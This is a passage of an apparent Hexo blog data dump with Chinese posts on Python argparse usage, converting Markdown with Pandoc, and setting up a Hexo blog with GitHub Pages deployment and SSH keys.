keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).</li>\n<li>Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.</li>\n<li>Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.</li>\n<li>Replace the OptionParser constructor version argument with a call to parser.add_argument(‘–version’, action=’version’, version=’<the version=\"\">‘).</the></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>   argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。<br>   官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。<br>   <a href=\"https://docs.python.org/3/library/argparse.html\">https://docs.python.org/3/library/argparse.html</a></p>\n</blockquote>\n<h2 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">import argparse                     # 导入模板</div><div class=\"line\"></div><div class=\"line\">parser = argparse.ArgumentParser()  # 创建parser</div><div class=\"line\"></div><div class=\"line\">parser.add_argument()               # 添加参数</div><div class=\"line\"></div><div class=\"line\">args = parser.parse_args()          # 参数解析</div></pre></td></tr></table></figure>\n<h2 id=\"ArgumentParser对象\"><a href=\"#ArgumentParser对象\" class=\"headerlink\" title=\"ArgumentParser对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argumentparser-objects\">ArgumentParser对象</a></h2><pre><code>class argparse.ArgumentParser(\n    prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n    usage=None,                 # 替换默认的Usage信息\n    description=None,           # 程序简要信息说明(参数说明前)\n    epilog=None,                # 附加信息说明(参数说明后)\n    parents=[],                 # 继承父解析器(parser)\n    formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n    prefix_chars=&apos;-&apos;,           # 参数前缀符号(默认为-,如：-h/--help)\n    fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n    argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n    conflict_handler=&apos;error&apos;,   # 参数冲突处理\n    add_help=True,              # 帮助信息中默认添加&quot;-h, --help&quot;描述\n    allow_abbrev=True           # 允许参数缩写\n)\n</code></pre><h2 id=\"add-argument-方法\"><a href=\"#add-argument-方法\" class=\"headerlink\" title=\"add_argument()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-add-argument-method\">add_argument()方法</a></h2><pre><code>ArgumentParser.add_argument(\n    name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n    [, action]      # 采取的基本操作\n                        store(默认)         存储参数值\n                        store_const        使用该字符串选项时，取用const值\n                        store_true         使用该字符串选项时，参数值置为True\n                        store_false        使用该字符串选项时，参数值置为False\n                        append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                        append_const       将多个字符串选项的const值合并到一个list\n                        count              统计选项出现的次数 （如：&quot;-vvv&quot;,则最终值为3）\n                        help               parser默认会添加一个help action。(一般不用理会)\n                        version            打印版本信息\n                        也可以自定义action类\n    [, nargs]       # 该参数值要求的数量\n                        数值       指明参数个数\n                        ?         提供了参数则取参数值；\n                                    无参数但声明了选项字符串则取const值；\n                                    无参数也未声明选择字符串则取default值\n                        *         所有参数存入list\n                        +         与*类似，但参数个数不能为空\n                        argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n    [, const]       # action/nargs部分要求的常值\n                        1、当action=&quot;store_const&quot;或者&quot;append_const&quot;时需要设置\n                        2、当选项为(-f/--foo),nargs=&apos;?&apos;，同时未提供具体参数时，取用该值。\n    [, default]     # 参数默认值\n    [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n    [, choices]     # 允许的参数值（白名单）,tuple/range\n    [, required]    # 选项是否必须，设置为True表示选项必填。\n    [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n    [, metavar]     # 定义参数在Usage信息中的名称\n    [, dest]        # 解析后的属性名称\n)\n</code></pre><ul>\n<li><h3 id=\"自定义action\"><a href=\"#自定义action\" class=\"headerlink\" title=\"自定义action\"></a><a href=\"https://docs.python.org/3/library/argparse.html#action-classes\">自定义action</a></h3><p>  class argparse.<strong>Action</strong>(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)</p>\n</li>\n</ul>\n<h2 id=\"parse-args-方法\"><a href=\"#parse-args-方法\" class=\"headerlink\" title=\"parse_args()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-parse-args-method\">parse_args()方法</a></h2><pre><code>ArgumentParser.parse_args(args=None, namespace=None)\n</code></pre><p>一般情况下，我们直接使用如下命令就可以了：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># args=None, 程序将sys.argv作为参数代入</span></div><div class=\"line\">args = parse.parse_args()              </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。</span></div><div class=\"line\">args = parser.parse_args([<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>, <span class=\"string\">'3'</span>, <span class=\"string\">'4'</span>])</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># namespace=custom_class，将属性分配到一个已经存在的对象中。</span></div><div class=\"line\">parser.parse_args(args=[<span class=\"string\">'--foo'</span>, <span class=\"string\">'BAR'</span>], namespace=custom_class99)</div></pre></td></tr></table></figure></p>\n<h2 id=\"其它工具\"><a href=\"#其它工具\" class=\"headerlink\" title=\"其它工具\"></a><a href=\"https://docs.python.org/3/library/argparse.html#other-utilities\">其它工具</a></h2><ul>\n<li><h3 id=\"子命令\"><a href=\"#子命令\" class=\"headerlink\" title=\"子命令\"></a><a href=\"https://docs.python.org/3/library/argparse.html#sub-commands\">子命令</a></h3><p>  很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。</p>\n<p>  ArgumentParser.<strong>add_subparsers</strong>([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparsers = parser.add_subparsers(dest=<span class=\"string\">'subparser_name'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1 = subparsers.add_parser(<span class=\"string\">'1'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1.add_argument(<span class=\"string\">'-x'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2 = subparsers.add_parser(<span class=\"string\">'2'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2.add_argument(<span class=\"string\">'y'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'2'</span>, <span class=\"string\">'frobble'</span>])</div><div class=\"line\">Namespace(subparser_name=<span class=\"string\">'2'</span>, y=<span class=\"string\">'frobble'</span>)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"文件类型对象\"><a href=\"#文件类型对象\" class=\"headerlink\" title=\"文件类型对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#filetype-objects\">文件类型对象</a></h3><p>  add_argument()中的FileType的参数”工厂”。</p>\n<p>  class argparse.<strong>FileType</strong>(mode=’r’, bufsize=-1, encoding=None, errors=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--raw'</span>, type=argparse.FileType(<span class=\"string\">'wb'</span>, <span class=\"number\">0</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'out'</span>, type=argparse.FileType(<span class=\"string\">'w'</span>, encoding=<span class=\"string\">'UTF-8'</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'--raw'</span>, <span class=\"string\">'raw.dat'</span>, <span class=\"string\">'file.txt'</span>])</div><div class=\"line\">Namespace(out=&lt;_io.TextIOWrapper name=<span class=\"string\">'file.txt'</span> mode=<span class=\"string\">'w'</span> encoding=<span class=\"string\">'UTF-8'</span>&gt;, raw=&lt;_io.FileIO name=<span class=\"string\">'raw.dat'</span> mode=<span class=\"string\">'wb'</span>&gt;)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"参数分组\"><a href=\"#参数分组\" class=\"headerlink\" title=\"参数分组\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argument-groups\">参数分组</a></h3><p>  在Usage信息中的参数分组，如pip -h可以看到”Commands”,”General Options”分组。</p>\n<p>  ArgumentParser.<strong>add_argument_group</strong>(title=None, description=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'testPROG'</span>, add_help=<span class=\"keyword\">False</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1 = parser.add_argument_group(<span class=\"string\">'group1'</span>, <span class=\"string\">'group1 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1.add_argument(<span class=\"string\">'foo'</span>, help=<span class=\"string\">'foo help'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2 = parser.add_argument_group(<span class=\"string\">'group2'</span>, <span class=\"string\">'group2 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2.add_argument(<span class=\"string\">'--bar'</span>, help=<span class=\"string\">'bar help'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.print_help()</div><div class=\"line\"></div><div class=\"line\">usage: testPROG [--bar BAR] foo</div><div class=\"line\"></div><div class=\"line\">group1:</div><div class=\"line\">group1 description</div><div class=\"line\"></div><div class=\"line\">foo    foo help</div><div class=\"line\"></div><div class=\"line\">group2:</div><div class=\"line\">group2 description</div><div class=\"line\"></div><div class=\"line\">--bar BAR  bar help</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"互斥\"><a href=\"#互斥\" class=\"headerlink\" title=\"互斥\"></a><a href=\"https://docs.python.org/3/library/argparse.html#mutual-exclusion\">互斥</a></h3><p>  参数互斥！</p>\n<p>  ArgumentParser.<strong>add_mutually_exclusive_group</strong>(required=False)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'PROG'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group = parser.add_mutually_exclusive_group(required=<span class=\"keyword\">True</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--bar'</span>, action=<span class=\"string\">'store_false'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">usage: PROG [-h] (--foo | --bar)</div><div class=\"line\">PROG: error: one of the arguments --foo --bar <span class=\"keyword\">is</span> required</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"解析器默认配置\"><a href=\"#解析器默认配置\" class=\"headerlink\" title=\"解析器默认配置\"></a><a href=\"https://docs.python.org/3/library/argparse.html#parser-defaults\">解析器默认配置</a></h3><p>  在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。</p>\n<p>  ArgumentParser.<strong>set_defaults</strong>(**kwargs)       # 设置默认值</p>\n<p>  ArgumentParser.<strong>get_default</strong>(dest)            # 获取默认值</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'foo'</span>, type=int)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>)   <span class=\"comment\"># 不审查是否在命令行中声明，故而bar，baz可以直接添加</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'736'</span>])</div><div class=\"line\">Namespace(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>, foo=<span class=\"number\">736</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'bar'</span>) <span class=\"comment\"># 解析器级别默认值总是覆盖参数级别默认值</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">Namespace(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'badger'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.get_default(<span class=\"string\">'foo'</span>)                   <span class=\"comment\"># 获取默认值</span></div><div class=\"line\"><span class=\"string\">'badger'</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"打印帮忙\"><a href=\"#打印帮忙\" class=\"headerlink\" title=\"打印帮忙\"></a><a href=\"https://docs.python.org/3/library/argparse.html#printing-help\">打印帮忙</a></h3><p>  用于打印帮助信息。</p>\n<p>  ArgumentParser.<strong>print_usage</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>print_help</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>format_usage</strong>()</p>\n<p>  ArgumentParser.<strong>format_help</strong>()</p>\n</li>\n<li><h3 id=\"部分解析\"><a href=\"#部分解析\" class=\"headerlink\" title=\"部分解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#partial-parsing\">部分解析</a></h3><p>  有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。</p>\n<p>  ArgumentParser.<strong>parse_known_args</strong>(args=None, namespace=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'bar'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_known_args([<span class=\"string\">'--foo'</span>, <span class=\"string\">'--badger'</span>, <span class=\"string\">'BAR'</span>, <span class=\"string\">'spam'</span>])</div><div class=\"line\">(Namespace(bar=<span class=\"string\">'BAR'</span>, foo=<span class=\"keyword\">True</span>), [<span class=\"string\">'--badger'</span>, <span class=\"string\">'spam'</span>])     <span class=\"comment\"># ['--badger', 'spam']即为多余的参数。</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"自定义文件解析\"><a href=\"#自定义文件解析\" class=\"headerlink\" title=\"自定义文件解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#customizing-file-parsing\">自定义文件解析</a></h3></li>\n<li><h3 id=\"退出方法\"><a href=\"#退出方法\" class=\"headerlink\" title=\"退出方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#exiting-methods\">退出方法</a></h3></li>\n<li><h3 id=\"optparse代码升级\"><a href=\"#optparse代码升级\" class=\"headerlink\" title=\"optparse代码升级\"></a><a href=\"https://docs.python.org/3/library/argparse.html#upgrading-optparse-code\">optparse代码升级</a></h3><p>  原本argparse是与optparse保持兼容的，但是！@#￥%……&amp;*（。升级办法如下：</p>\n</li>\n</ul>\n<ol>\n<li>Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.</li>\n<li>Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.</li>\n<li>Replace callback actions and the callback_* keyword arguments with type or action arguments.</li>\n<li>Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).</li>\n<li>Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.</li>\n<li>Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.</li>\n<li>Replace the OptionParser constructor version argument with a call to parser.add_argument(‘–version’, action=’version’, version=’<the version>‘).</li>\n</ol>\n"},{"title":"Pandoc | a universal document converter","date":"2017-05-02T02:02:42.000Z","_content":"\n近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。\n\n\n官方主页: [http://www.pandoc.org](http://www.pandoc.org)\n\nGet Start: [http://www.pandoc.org/getting-started.html](http://www.pandoc.org/getting-started.html)\n## 安装\n```bash\nbrew install pandoc     # 简单到爆\npandoc --verison        # 查看版本\n```\n## 转换文件\nDemos : [http://www.pandoc.org/demos.html](http://www.pandoc.org/demos.html)\n```bash\npandoc test.md -f markdown -t html -s -o test.html\n# 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.\n\npandoc -s -S MANUAL.txt -o example29.docx\n\npandoc source/_posts/Pandoc-a-universal-document-converter.md -o ~/TempDocs/pandoc.docx\n\n```\n\n![本地图片](../img/dreamcruise.jpg)\n![远程图片](https://images.apple.com/v/home/df/images/promos/airpods_large.jpg)\n\n实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。","source":"_posts/Pandoc-a-universal-document-converter.md","raw":"---\ntitle: Pandoc | a universal document converter\ndate: 2017-05-02 10:02:42\ntags:\n---\n\n近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。\n\n\n官方主页: [http://www.pandoc.org](http://www.pandoc.org)\n\nGet Start: [http://www.pandoc.org/getting-started.html](http://www.pandoc.org/getting-started.html)\n## 安装\n```bash\nbrew install pandoc     # 简单到爆\npandoc --verison        # 查看版本\n```\n## 转换文件\nDemos : [http://www.pandoc.org/demos.html](http://www.pandoc.org/demos.html)\n```bash\npandoc test.md -f markdown -t html -s -o test.html\n# 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.\n\npandoc -s -S MANUAL.txt -o example29.docx\n\npandoc source/_posts/Pandoc-a-universal-document-converter.md -o ~/TempDocs/pandoc.docx\n\n```\n\n![本地图片](../img/dreamcruise.jpg)\n![远程图片](https://images.apple.com/v/home/df/images/promos/airpods_large.jpg)\n\n实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。","slug":"Pandoc-a-universal-document-converter","published":1,"updated":"2017-06-06T09:30:47.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3oafltc0004a8uvdf8b1wrq","content":"<p>近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。</p>\n<p>官方主页: <a href=\"http://www.pandoc.org\" target=\"_blank\" rel=\"external\">http://www.pandoc.org</a></p>\n<p>Get Start: <a href=\"http://www.pandoc.org/getting-started.html\" target=\"_blank\" rel=\"external\">http://www.pandoc.org/getting-started.html</a></p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install pandoc     <span class=\"comment\"># 简单到爆</span></div><div class=\"line\">pandoc --verison        <span class=\"comment\"># 查看版本</span></div></pre></td></tr></table></figure>\n<h2 id=\"转换文件\"><a href=\"#转换文件\" class=\"headerlink\" title=\"转换文件\"></a>转换文件</h2><p>Demos : <a href=\"http://www.pandoc.org/demos.html\" target=\"_blank\" rel=\"external\">http://www.pandoc.org/demos.html</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">pandoc test.md <span class=\"_\">-f</span> markdown -t html <span class=\"_\">-s</span> -o test.html</div><div class=\"line\"><span class=\"comment\"># 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.</span></div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"_\">-s</span> -S MANUAL.txt -o example29.docx</div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"built_in\">source</span>/_posts/Pandoc<span class=\"_\">-a</span>-universal-document-converter.md -o ~/TempDocs/pandoc.docx</div></pre></td></tr></table></figure></p>\n<p><img src=\"../img/dreamcruise.jpg\" alt=\"本地图片\"><br><img src=\"https://images.apple.com/v/home/df/images/promos/airpods_large.jpg\" alt=\"远程图片\"></p>\n<p>实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。</p>\n<p>官方主页: <a href=\"http://www.pandoc.org\">http://www.pandoc.org</a></p>\n<p>Get Start: <a href=\"http://www.pandoc.org/getting-started.html\">http://www.pandoc.org/getting-started.html</a></p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install pandoc     <span class=\"comment\"># 简单到爆</span></div><div class=\"line\">pandoc --verison        <span class=\"comment\"># 查看版本</span></div></pre></td></tr></table></figure>\n<h2 id=\"转换文件\"><a href=\"#转换文件\" class=\"headerlink\" title=\"转换文件\"></a>转换文件</h2><p>Demos : <a href=\"http://www.pandoc.org/demos.html\">http://www.pandoc.org/demos.html</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">pandoc test.md <span class=\"_\">-f</span> markdown -t html <span class=\"_\">-s</span> -o test.html</div><div class=\"line\"><span class=\"comment\"># 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.</span></div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"_\">-s</span> -S MANUAL.txt -o example29.docx</div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"built_in\">source</span>/_posts/Pandoc<span class=\"_\">-a</span>-universal-document-converter.md -o ~/TempDocs/pandoc.docx</div></pre></td></tr></table></figure></p>\n<p><img src=\"../img/dreamcruise.jpg\" alt=\"本地图片\"><br><img src=\"https://images.apple.com/v/home/df/images/promos/airpods_large.jpg\" alt=\"远程图片\"></p>\n<p>实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。</p>\n"},{"title":"The begin of blog","_content":"浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。\n这篇就算是一个开端，主要记录下hexo该如何使用。\n\n## 搭建hexo静态博客\nHexo官方文档 :: [https://hexo.io/zh-cn/docs](https://hexo.io/zh-cn/docs)\n### 安装\n\n``` bash\n$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      # 下载Node.js安装包\n$ open node-v6.10.2.pkg      # 傻瓜式安装\n$ brew install git           # 安装git\n$ npm install -g hexo-cli    # 安全hexo\n$ hexo init <folder>         # 从hexo官网下载初始化文件\n$ cd <folder>                \n$ npm install                # 安装站点文件\n\n$ hexo server                # 启动服务器。默认情况下，访问网址为： http://localhost:4000/\n\n$ hexo new [layout] <title>  # 新建一个post\n$ hexo generate              # 生成静态文件\n```\n\n### 使用\n\n``` bash\n$ hexo new [layout] <title>    # layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。\n                               # Hexo 有三种默认布局：post、page 和 draft。\n\n$ hexo new draft <title0>       # 新建一份草稿\n$ hexo publish [layout] <title0>   # 将draft移动到post\n$ hexo generate                 # 生成静态文件\n```\n\n### 部署\n\n``` bash\n$ npm install hexo-deployer-git --save      # 安装hexo-deployer-git以实现git部署\n\n$ vim _config.yml\n--------------[file content]\n    deploy:\n      type: git\n      repo: <repository url>    # 库（Repository）地址\n      branch: [branch]          # 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。\n      message: [message]        # 自定义提交信息 (默认为 Site updated: {{ now('YYYY-MM-DD HH:mm:ss') }})\n--------------[file content]\n$ hexo deploy     # 部署\n```\n\n## Github 配置\n### 新建用于存放pages的repo\n在GitHub上建一个repository（库），任意命名。\n如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。\n如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。\n\n### 新建SSH Keys\n我使用SSH连接GitHub。 [官方文档](https://help.github.com/articles/connecting-to-github-with-ssh/)\n\n``` bash\n$ ls -al ~/.ssh     # 查看是否有 id_rsa 和 id_rsa.pub 文件\n# 如果不存在或者想要生成新的密钥对，可使用下面命令\n$ ssh-keygen -t rsa -b 4096 -C \"user@oddboy.cn\"\n$ pbcopy < ~/.ssh/id_rsa.pub    # 很强势的一个命令，将文件内容直接复制到剪贴板。\n```\n在GitHub的Personal setting --> SSH and GPG keys点击“New SSH 